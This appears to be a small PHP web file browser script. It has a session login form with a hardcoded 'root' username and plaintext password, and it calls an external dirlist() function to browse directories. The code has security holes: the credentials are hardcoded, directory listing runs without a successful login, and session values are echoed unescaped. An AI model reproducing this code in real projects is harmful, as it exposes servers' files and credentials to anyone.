<!DOCTYPE html>
    <html class="htmlid">
        <head>
            <meta charset="UTF-8">
            <link rel="stylesheet" href="mrfiles/mdr.css">
            <title>mr</title>
        </head>
    </html>

<?php
    include_once("mrfiles/functions.php");

    //////// Session Control ////////
    session_start();
    if( isset($_SESSION['url']) === false )
    {
        $_SESSION['url'] = "http://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
        $_SESSION['url'] = str_replace('mdr.php5','',$_SESSION['url']);
    }
    if( isset($_SESSION['login']) === false )
    {
        $login = $_SESSION['login'] = -1;
    }
    else
    {
        $login = $_SESSION['login'];
    }

    if( isset( $_SESSION['username'] ) === false )
    {
        $username = $_SESSION['username'] = "";
    }
    else
    {
        $username = $_POST['username'];
    }

    if( isset($_SESSION['password']) === false )
    {
        $password = $_SESSION['password'] = "";
    }
    else
    {
        $password = $_POST['password'];
    }
?>


<?php

    //////// check valid root ////////
    if ( $login === -1)
    {
        echo<<<HTML
                <body>
                    <form method="post" action="mdr.php5?one=true">
                        <h2> Username : <input class="ninput" type="text" name="username" value="$_SESSION[username]"></h2>
                        <h2> Password : <input class="ninput" type="password" name="password" value="$_SESSION[username]"></h2>
                        <h2> enter : <input class="ninput" type="submit" name="submit" value="admin"></h2>
                    </form>
                </body>
HTML;
    }
?>

<?php

    //////// Get username and password with POST ////////
    if( isset($_POST['submit']) === true && ($login === -1) )
    {
        if ($username === 'root' && $password === 'masoudsam')
        {
            $_SESSION['login'] = $login = 1;
        }
        else
        {
            die('<h2>try again</h2>');
        }
    }
?>

<?php

    //////// browse ////////
    if ( is_string( key($_GET) ) === true )
    {
        $keyg = key($_GET);
        if ( $keyg === "one" && $_GET[$keyg] === "true" )
        {
            header("Location: mdr.php5");
        }
        dirlist($_GET);
    }
    else
    {
        dirlist( array() );
    }
?>